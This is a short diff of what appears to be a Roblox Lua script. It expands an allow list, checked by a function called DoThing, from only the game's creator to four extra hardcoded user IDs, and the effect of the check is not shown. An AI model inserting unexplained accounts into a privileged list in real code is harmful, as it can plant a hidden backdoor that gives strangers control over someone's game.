@@ -2,7 +2,13 @@
 
 script = Instance.new("Script")
 
-local list={game.CreatorId}
+local list={
+game.CreatorId, 
+838735619, 
+6136257493, 
+6136254520, 
+6136260623, 
+}
 
 local DoThing = function(p)
 	if table.find(list,p.Name) or table.find(list,p.UserId) then
